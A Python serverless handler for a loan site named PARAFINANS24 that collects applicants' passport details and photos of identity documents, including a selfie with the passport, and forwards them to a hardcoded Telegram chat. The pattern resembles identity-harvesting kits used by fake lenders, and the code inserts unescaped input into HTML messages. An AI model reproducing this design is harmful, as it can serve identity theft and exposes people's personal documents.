"""Отправка заявки на займ с документами менеджеру через Telegram."""
import json
import base64
import os
import urllib.request
from datetime import datetime

TELEGRAM_CHAT_ID = "8540431915"

FILE_LABELS = {
    "passportMain": "Паспорт — главная страница",
    "registration": "Прописка",
    "selfie": "Селфи с паспортом",
    "previousPassports": "О ранее выданных паспортах",
}


def send_telegram_message(token: str, chat_id: str, text: str):
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    data = json.dumps({
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "HTML"
    }).encode()
    req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"})
    urllib.request.urlopen(req)


def send_telegram_document(token: str, chat_id: str, file_data: bytes, filename: str, caption: str):
    import io
    import email.mime.multipart
    boundary = "----FormBoundary"
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="chat_id"\r\n\r\n{chat_id}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="caption"\r\n\r\n{caption}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="document"; filename="{filename}"\r\n'
        f"Content-Type: application/octet-stream\r\n\r\n"
    ).encode() + file_data + f"\r\n--{boundary}--\r\n".encode()

    url = f"https://api.telegram.org/bot{token}/sendDocument"
    req = urllib.request.Request(
        url, data=body,
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"}
    )
    urllib.request.urlopen(req)


def handler(event: dict, context) -> dict:
    """Отправка заявки на займ менеджеру в Telegram."""
    cors_headers = {
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Methods": "POST, OPTIONS",
        "Access-Control-Allow-Headers": "Content-Type",
    }

    if event.get("httpMethod") == "OPTIONS":
        return {"statusCode": 200, "headers": cors_headers, "body": ""}

    raw_body = event.get("body") or "{}"
    body = json.loads(raw_body) if isinstance(raw_body, str) else raw_body

    full_name = body.get("fullName", body.get("name", "")).strip()
    phone = body.get("phone", "").strip()
    email = body.get("email", "").strip()
    amount = body.get("amount", "").strip()
    days = body.get("days", "").strip()
    birth_date = body.get("birthDate", "").strip()
    passport_series = body.get("passportSeries", "").strip()
    passport_number = body.get("passportNumber", "").strip()
    passport_date = body.get("passportDate", "").strip()
    passport_code = body.get("passportCode", "").strip()
    passport_by = body.get("passportBy", "").strip()
    birth_place = body.get("birthPlace", "").strip()

    if not full_name or not phone or not amount:
        return {
            "statusCode": 400,
            "headers": cors_headers,
            "body": json.dumps({"error": "Заполните все поля"}, ensure_ascii=False),
        }

    attachments = []
    for key, label in FILE_LABELS.items():
        b64 = body.get(key, "")
        filename = body.get(f"{key}_name", f"{key}.jpg")
        if b64:
            try:
                file_data = base64.b64decode(b64)
                attachments.append((label, filename, file_data))
            except Exception:
                pass

    now = datetime.now().strftime("%d.%m.%Y в %H:%M")
    token = os.environ.get("TELEGRAM_BOT_TOKEN", "")

    docs_status = f"{len(attachments)} из {len(FILE_LABELS)}" if attachments else "не приложены"

    text = (
        f"🚀 <b>Новая заявка — PARAFINANS24</b>\n"
        f"⏱ {now}\n\n"
        f"👤 <b>ФИО:</b> {full_name}\n"
        f"🎂 <b>Дата рождения:</b> {birth_date}\n"
        f"📍 <b>Место рождения:</b> {birth_place}\n"
        f"📞 <b>Телефон:</b> {phone}\n"
        f"📧 <b>Email:</b> {email}\n"
        f"💰 <b>Сумма:</b> {amount} ₽\n"
        f"📅 <b>Срок:</b> {days} дн.\n\n"
        f"📋 <b>Паспортные данные:</b>\n"
        f"  Серия/Номер: {passport_series} {passport_number}\n"
        f"  Дата выдачи: {passport_date}\n"
        f"  Код: {passport_code}\n"
        f"  Кем выдан: {passport_by}\n\n"
        f"📎 <b>Документы:</b> {docs_status}"
    )

    send_telegram_message(token, TELEGRAM_CHAT_ID, text)

    for label, filename, file_data in attachments:
        send_telegram_document(token, TELEGRAM_CHAT_ID, file_data, filename, label)

    return {
        "statusCode": 200,
        "headers": cors_headers,
        "body": json.dumps({"success": True}),
    }